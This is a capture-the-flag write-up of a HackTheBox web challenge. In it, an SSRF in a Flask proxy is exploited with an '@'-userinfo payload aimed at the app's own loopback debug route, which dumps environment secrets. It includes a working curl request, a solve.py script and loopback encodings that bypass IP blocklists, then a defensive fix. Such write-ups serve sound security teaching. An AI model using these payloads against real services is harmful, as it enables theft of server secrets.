---
title: "ProxyAsAService"
date: 2027-03-27 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssrf, flask, proxy, cwe-918]
description: "An Easy Web challenge: a Flask 'web proxy' appends your input onto a hardcoded reddit.com host. By prefixing the tail with @, reddit.com becomes URL userinfo and the request reroutes to the app's own loopback — satisfying a localhost-only debug route that dumps the environment, with 0.0.0.0 slipping past a substring IP blocklist."
---

## Overview

ProxyAsAService is an Easy Web challenge built on a small Flask "web proxy" that fetches Reddit on your behalf. The path to the flag is a single [server-side request forgery](https://cwe.mitre.org/data/definitions/918.html): the proxy concatenates your input onto a fixed host, so injecting a URL `@`-authority hijacks the destination and points it at the app's own loopback — reaching a localhost-only debug route that returns every environment variable, the flag among them.

## The technique

The app exposes two routes. The index proxies a fixed site, appending the attacker-controlled `url` query parameter directly onto the host:

```python
SITE_NAME = 'reddit.com'

@proxy_api.route('/', methods=['GET', 'POST'])
def proxy():
    url = request.args.get('url')            # attacker controls only the TAIL
    ...
    target_url = f'http://{SITE_NAME}{url}'   # fixed host + your tail
    response, headers = proxy_req(target_url)
    return Response(response.content, response.status_code, headers.items())
```

The second route leaks the environment — but only to localhost:

```python
@debug.route('/environment', methods=['GET'])
@is_from_localhost                            # request.remote_addr must be 127.0.0.1
def debug_environment():
    return jsonify({'Environment variables': dict(os.environ), ...})
```

The flag lives in an environment variable, so dumping `os.environ` wins. The proxy's only "safety" check is a substring blocklist:

```python
RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']
def is_safe_url(url):
    for restricted_url in RESTRICTED_URLS:
        if restricted_url in url:             # naive substring match
            return False
    return True
```

Three observations crack it open:

1. **You only control the URL tail**, appended to a hardcoded `reddit.com` — you cannot replace the host directly.
2. **The `@` authority trick.** In `http://reddit.com@HOST:PORT/path`, everything before `@` is *userinfo* (a username); the request connects to `HOST:PORT`. So `?url=@0.0.0.0:1337/debug/environment` builds `http://reddit.com@0.0.0.0:1337/debug/environment` and actually hits `0.0.0.0:1337` — the app's own server.
3. **Loopback without the blocked substrings.** Because the request now originates from the app itself, `request.remote_addr == '127.0.0.1'` and the localhost gate passes. And `0.0.0.0` (which routes to loopback on Linux) contains none of `localhost` / `127.` / `10.` / `172.` / `192.168.`, so the substring blocklist is satisfied too. Fallback encodings if `0.0.0.0` were blocked: decimal `2130706433`, hex `0x7f000001`, `[::1]`, or `127.1`.

## Solution

The whole exploit is a single request:

```bash
curl -s "http://HOST:PORT/?url=@0.0.0.0:1337/debug/environment"
# -> {"Environment variables": {"FLAG": "HTB{...}", ...}}
```

`solve.py` — the durable artifact, run as `python3 solve.py HOST:PORT`:

```python
#!/usr/bin/env python3
import sys, requests

base = sys.argv[1] if len(sys.argv) > 1 else "HOST:PORT"
if not base.startswith("http"):
    base = "http://" + base

# '@0.0.0.0:1337/...' makes 'reddit.com' the URL userinfo and reroutes to loopback;
# 0.0.0.0 matches none of the blocked substrings, and the request originates from the
# app so the remote_addr == 127.0.0.1 gate on /debug/environment passes.
payload = "@0.0.0.0:1337/debug/environment"
r = requests.get(base + "/", params={"url": payload}, timeout=20)
env = r.json().get("Environment variables", {})
print("FLAG:", env.get("FLAG"))
```

Running it prints the flag (`HTB{...}`, redacted here) straight out of the dumped environment.

## Why it worked

URL authority parsing treats everything before `@` as userinfo, so a fixed leading host is throwaway the moment you control the path tail. The `remote_addr == 127.0.0.1` check is a *location* test, not authentication — any SSRF-of-self forges it for free. And substring blocklists never normalize IP representations, so `0.0.0.0`, the decimal/hex integer forms, and IPv6 `[::1]` all reach loopback while matching no blocked string.

## Fix / defense

Parse the URL and validate the *resolved* address, never a substring of the raw string; reject any userinfo; and never treat a loopback source as authorization for a secret-dumping route.

```python
from urllib.parse import urlparse
import socket, ipaddress

p = urlparse(user_url)
if p.username or p.password:                 # no @-userinfo host hijack
    abort(403)
ip = ipaddress.ip_address(socket.gethostbyname(p.hostname))
if ip.is_loopback or ip.is_private or ip.is_link_local or ip.is_unspecified:
    abort(403)                               # validate the RESOLVED ip, not a substring
```

The `/debug/environment` route should require a real credential rather than trusting `remote_addr`, and secrets like the flag should never sit in a debug-reachable environment in the first place.
